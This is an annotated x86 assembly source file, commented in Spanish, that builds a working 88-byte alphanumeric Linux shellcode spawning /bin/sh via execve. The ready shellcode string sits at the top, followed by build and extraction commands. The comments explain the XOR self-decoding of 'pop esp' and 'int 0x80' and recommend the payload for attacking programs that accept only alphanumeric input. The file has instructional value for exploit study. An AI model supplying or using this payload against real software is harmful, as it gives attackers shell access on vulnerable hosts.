; Shellcode: HHDDDDfj0Y0H0fhzzYAAAAAA0HX0hY0HYDPhu12ZX5ZBZZlPhu834X5ZZZZPTYhjaaaX5aaaaP4a4jPPQTUVWaMz
; Longitud: 88 bytes
;
; En este codigo, solo se usaran los siguientes caracteres: a-z A-Z 0-9
; Para 0-9: \x30-\x39
; Para A-Z: \x41-\x5a
; Para a-z: \x61-\x7a
;
; Comando de compilacion:
; nasm -f elf shellcode.nasm; ld -m elf_i386 -s -o shellcode shellcode.o; objdump -d ./shellcode|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
;
; (PROMO) Ha sido mucho mas facil crear este shellcode gracias a: https://defuse.ca/online-x86-assembler.htm
; (GUIAS) Donde aprender como programar Shellcode alfanumerico: http://phrack.org/issues/57/15.html



; EXPLICACION DE COMO FUNCIONA ESTE SHELLCODE
; Este ShellCode es un ShellCode alfanumerico, es decir, solo contiene letras y numeros.
; Invoca, con execve, a /bin/sh
;
; Para que funcione el ShellCode, se debe cumplir que al inicio de la ejecucion de su ejecucion:
; - EAX contenga la direccion de memoria del ShellCode
; - El ESP apunta al final del shellcode o mas lejos, o antes del inicio del Shellcode
;
; Este ShellCode es muy util para cuando:
; - El programa siendo atacado solo admite letras y numeros como input
; - El ESP apunta al final del shellcode o mas lejos, y debido a ello, lo sobreescribe
;
; Si se cumplen ambas opciones en nuestro escenario, durante la creacion del ShellCode, surgen los siguientes problemas:
; - Por culpa del Stack Pointer, que apunta al fin de nuestro ShellCode, sobreescribiremos nuestro Shellcode, desde su fin a su inicio.
;   Abordaremos este problema creando un espacio reservado de memoria para el ShellCode, y finalmente cambiando el valor de ESP con un "pop esp"
; - Las instrucciones "pop esp" e "int 0x80", al ser compiladas no generan bytes alfanumericos.
;   Abordaremos esta situacion guardandolas cifradas en el ShellCode, y descifrandolos con la instruccion XOR. Para guardarlas cifradas, usaremos "db" y "dw"


; DECREMENTO DE EAX
; Cuando descifremos el "pop esp", usaremos la instruccion xor  BYTE [eax + OffSet], cl
; Ese OffSet debe ser, como minimo, 0x30, para que el OPCODE resulte en bytes alfanumericos.
; Debido a esto, decrementamos EAX 2 veces seguidas para poder utilizar en un futuro 0x30 como OffSet
dec eax ; 48 = H
dec eax ; 48 = H
; 2 bytes usados en este bloque de codigo



; MEMORIA RESERVADA PARA EL SHELLCODE.
; Durante la ejecucion del shellcode, vamos a tener un problema. ESP tiene guardado como valor la direccion de memoria
; en la que termina nuestro shellcode, y cuando hagamos un push estaremos sobreescribiendolo, ya que cuando usamos un
; push, estamos restando 4 a ESP para que apunte al ultimo valor insertado en el Stack.
; Debido a ello, vamos a crear un espacio de memoria reservada para el ShellCode.
; Usaremos este espacio para maniobrar hasta que lleguemos el "pop esp", donde guardaremos en ESP el valor de EAX (inicio
; del shellcode), y ahi no sobreescribiremos el shellcode.
; Esta memoria ira creciendo segun se use la instruccion "pop", ya que "pop" saca un DWORD del Stack y aumenta 4 al ESP,
; sin embargo, en alguna ocasion vamos a usar un push WORD, que solo resta 2 al ESP. De esta manera, empezamos con 4 bytes
; de memoria reservada, pero llegamos a tener 9
;    Empezamos el shellcode con 4 bytes de memoria reservada para si mismo
inc esp ; 44 = D
inc esp ; 44 = D
inc esp ; 44 = D
inc esp ; 44 = D
; Cantidad actual de memoria reservada para shellcode: 4 bytes
; 4 bytes usados en este bloque de codigo



; DESCIFRADO DE "POP ESP"
; Usamos edx para descifrar "pop esp" cifrado con XOR.
; 0x5c = 0x30 (valor de cl actuamente) ^ 'l' (opcode cifrado de pop esp)
push WORD 0x30             ; 66 6a 30 = f j 0
pop  ecx                   ; 59       = Y     ; Ganamos 2 bytes de memoria reservada para el shellcode
xor  BYTE [eax + 0x30], cl ; 30 48 31 = 0 H 1
; Cantidad actual de memoria reservada para shellcode: 6 bytes
; 7 bytes usados en este bloque de codigo



; DESCIFRADO DE "INT 0x80"
; Usamos edx para descifrar "int 0x80" cifrado con XOR.
; Aqui eax tiene guardada la direccion de la primera instruccion del shellcode. El int 0x80 ocupa dos bytes y esta alojado en el penultimo y ultimo byte
;   DESCIFRAMOS PRIMER BYTE DEL INT 0x80 (Guardado como 0x4d, tiene que acabar valiendo 0xcd): Guardamos el byte imprimible mas alto en el stack  
push WORD 0x7a7a                ; 66 68 7a 7a = f h z z
pop  ecx                        ; 59          = Y       ; Ganamos 2 bytes de memoria reservada para el shellcode
; Lo incrementamos 6 veces hasta llegar a 0x80
inc ecx                         ; 41 = A
inc ecx                         ; 41 = A
inc ecx                         ; 41 = A
inc ecx                         ; 41 = A
inc ecx                         ; 41 = A
inc ecx                         ; 41 = A
; Desciframos ese primer byte: 0x4d ^ 0x80 = 0xcd
xor BYTE [eax + 0x58], cl ; 30 48 59 = 0 H Y
;   DESCIFRAMOS SEGUNDO BYTE DEL INT 0x80 (Guardado como 0x7a, tiene que acabar valiendo 0x80)
; Primero le realizamos xor con el registro ecx (En concreto ch, que todavia vale 0x7a): 0x7a ^ 0x7a = 0x00
xor BYTE [eax + 0x59], ch ; 30 68 5a = 0 h Z
; Usamos xor para guardar el byte del registro ecx (En concreto cl, que vale 80): 0x00 ^ 0x80 = 0x80
xor BYTE [eax + 0x59], cl ; 30 48 5a = 0 H Z
; Cantidad actual de memoria reservada para shellcode: 8 bytes
; 20 bytes usados en este bloque de codigo



; GUARDADO DE LA DIRECCION DE MEMORIA DEL COMIENZO DEL SHELLCODE EN EL STACK
; Realizamos un "inc esp" para ganar un byte extra de memoria reservada para el shellcode y terminar de conseguir el OffSet 0x30 para su descifrado
inc  esp ; 44 = D
; Luego pusheamos eax para que ESP obtenga su valor tras realizar el "pop esp"
push eax ; 50 = P
; Cantidad actual de memoria reservada para shellcode: 9 bytes
; 2 bytes usados en este bloque de codigo



; DESCIFRADO Y GUARDADO DE LA STRING "/bin/sh\0" EN EL STACK
; Aqui guardaremos la string "/bin/sh\0" en el stack
; Como no se pueden meter en el shellcode ni el caracter '/' ni el Null Byte, se introducira una String cifrada y se descifrara con XOR
;    Primer DWORD de la String
; 'Z21u' ^ 'ZZBZ' = '\0hs/'
; - descifrado: 0x5a323175 ^ 0x5a5a425a
push 0x5a323175      ; 68 75 31 32 5a = h u 1 2 Z
pop  eax             ; 58             = X
xor  eax, 0x5a5a425a ; 35 5a 42 5a 5a = 5 Z B Z Z
; 11 bytes hasta el momento
; EN MEDIO DEL DESCIFRADO DE "/bin/sh\0", EJECUTAMOS EL "POP ESP"
; Lo tenemos que hacer justo antes de empezar a guardar "/bin/sh\0" en el stack, ya que ahora va a cambiar el ESP.
; Lo hacemos en este preciso instante por que es justo aqui cuando conseguimos el OffSet 0x30
db 0x6c ; 6c = l ; Cuando se descifre resultara en: pop esp ; 5c
; CONTINUAMOS CON EL GUARDADO Y DESCIFRADO DE "/bin/sh\0"
push eax             ; 50             = P
;    Segundo  DWORD de la String
; '438u' ^ 'ZZZZ' = 'nib/'
; - descifrado: 0x34333875 ^ 0x5a5a5a5a
push 0x34333875      ; 68 75 38 33 34 = h u 8 3 4
pop  eax             ; 58             = X
xor  eax, 0x5a5a5a5a ; 35 5a 5a 5a 5a = 5 Z Z Z Z
push eax             ; 50             = P
; 25 bytes usados en este bloque de codigo



; Hacer que ECX apunte al inicio de la String ('/bin/sh\0'). Luego le daremos este valor a EBX y ECX valdra 0x00000000
push esp ; 54 = T
pop  ecx ; 59 = Y
; 2 bytes usados en este bloque de codigo



; Dar a EAX el valor 11
push 0x6161616a      ; 68 6a 61 61 61 = h j a a a
pop  eax             ; 58             = X
xor  eax, 0x61616161 ; 35 61 61 61 61 = 5 a a a a
; 11 bytes usados en este bloque de codigo



; Hacer que:
; - EDX valga 0x0
; - EBX valga lo mismo que ECX (direccion de memoria de "/bin/sh\0")
; - ECX valga 0x0
push eax ; 50 = P ; EAX no cambia
; Cambiamos el valor de EAX de 0xb a 0x0, para darle este valor a EDX y a ECX
xor  al, 0x61 ; 34 61 = 5 a
xor  al, 0x6a ; 34 6a = 5 j
; Seguimos guardando el resto del valores para el popad
push eax ; 50 = P ; ECX = EAX nuevo (EAX = 0x0)
push eax ; 50 = P ; EDX = EAX nuevo (EAX = 0x0)
push ecx ; 51 = Q ; EBX = ECX (Direccion de memoria de la String '/bin/sh\0')
push esp ; 54 = T ; ESP no cambia (En realidad ESP siempre se ignora en popad, por eso no cambia)
push ebp ; 55 = U ; EBP no cambia
push esi ; 56 = V ; ESI no cambia
push edi ; 57 = W ; EDI no cambia
popad    ; 61 = a ; Se guardan todos esos registros (Ignorando ESP)
; 13 bytes usados en este bloque de codigo



; Se ejecuta execve con el "int 0x80"
dw 0x7a4d ; 4d 7a = M z ; Cuando se descifre, resulta en la instruccion: int 0x80  ->  cd 80 (Bytes no imprimibles)
; 2 bytes usados en este bloque de codigo
